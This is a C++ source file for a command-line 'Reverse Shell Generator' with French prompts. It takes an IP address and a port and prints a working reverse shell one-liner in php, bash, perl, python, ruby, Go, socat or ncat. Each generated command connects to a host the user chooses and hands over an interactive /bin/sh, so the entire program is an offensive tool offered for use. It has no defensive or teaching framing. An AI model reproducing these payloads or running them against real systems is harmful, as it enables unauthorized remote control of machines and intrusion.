#include <iostream>

int main()
{
    int i = 0;
    std::cout << 
"██████╗ ███████╗██╗   ██╗███████╗██████╗ ███████╗███████╗      ███████╗██╗  ██╗███████╗██╗     ██╗\n"<<               
"██╔══██╗██╔════╝██║   ██║██╔════╝██╔══██╗██╔════╝██╔════╝      ██╔════╝██║  ██║██╔════╝██║     ██║\n"<<                     
"██████╔╝█████╗  ██║   ██║█████╗  ██████╔╝███████╗█████╗        ███████╗███████║█████╗  ██║     ██║\n"<<                     
"██╔══██╗██╔══╝  ╚██╗ ██╔╝██╔══╝  ██╔══██╗╚════██║██╔══╝        ╚════██║██╔══██║██╔══╝  ██║     ██║\n"<<                     
"██║  ██║███████╗ ╚████╔╝ ███████╗██║  ██║███████║███████╗      ███████║██║  ██║███████╗███████╗███████╗\n"<<               
"╚═╝  ╚═╝╚══════╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝      ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝\n"<<                    
                                                                                                                                                      
" ██████╗ ███████╗███╗   ██╗███████╗██████╗  █████╗ ████████╗ ██████╗ ██████╗ \n"<< 
"██╔════╝ ██╔════╝████╗  ██║██╔════╝██╔══██╗██╔══██╗╚══██╔══╝██╔═══██╗██╔══██╗\n"<< 
"██║  ███╗█████╗  ██╔██╗ ██║█████╗  ██████╔╝███████║   ██║   ██║   ██║██████╔╝\n"<< 
"██║   ██║██╔══╝  ██║╚██╗██║██╔══╝  ██╔══██╗██╔══██║   ██║   ██║   ██║██╔══██╗\n"<< 
"╚██████╔╝███████╗██║ ╚████║███████╗██║  ██║██║  ██║   ██║   ╚██████╔╝██║  ██║\n"<< 
" ╚═════╝ ╚══════╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝\n\n";
    std::cout << "Quel langage voulez-vous choisir?\n";
    std::cout << "1-php\n2-bash\n3-perl\n4-python\n5-ruby\n6-Golang\n7-Socat\n8-Ncat -e\n";
    std::cout << "Selectionne le avec un nombre, ex. 7:\n";

    int index;
    std::cin >> index;
    std::string ipaddr;
    int port;
    std::cout<<"Ce tool ne vérifie pas si l'ip est valide.\nAssurez-vous alors de ne pas faire de faute de frappe...\n";
    std::cout << "IP:\n";
    std::cin >> ipaddr;
    std::cout << "\nPort:";
    std::cin >> port;

    std::cout << "Ton script est géneré: \n\n";
    switch (index)
    {
    case (1):
        std::cout << "php -r '$sock=fsockopen(\"" << ipaddr << "\"," << port << ");exec(\"/bin/sh -i <&3 >&3 2>&3\");'\n"; // php
        break;
    case (2):
        std::cout << "bash -i >& /dev/tcp/" << ipaddr << "/" << port << " 0>&1\n"; // bash
        break;
    case (3):
        std::cout << "perl -e 'use Socket;$i=\""<<ipaddr<<"\";$p="<<port
        <<";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"<<
        "if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");"<<
        "open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'\n"; // perl
        break;
    case (4):
        std::cout << "python -c 'import socket,subprocess,os;"<<
        "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"<<
        "s.connect((\""<<ipaddr<<"\","<<port<<"));os.dup2(s.fileno(),0);"<<
        " os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n"; // python
        break;
    case (5):
        std::cout << "ruby -rsocket -e'f=TCPSocket.open(\""<<ipaddr<<"\","<<port<<").to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'\n"; //ruby
        break;
    case (6):
        std::cout << "echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"" <<ipaddr<< ":" <<port<< "\");cmd:=exec.Command(\"sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go"; // golang
        break;
    case (7):
        std::cout << "socat TCP:" <<ipaddr<< ":" <<port<< " EXEC:sh"; // socat
        break;
    case (8):
        std::cout << "ncat " <<ipaddr<< " " <<port<< " -e sh"; // ncat
        break;
    default:
        break;
    }
}
// thanks to https://www.revshells.com/
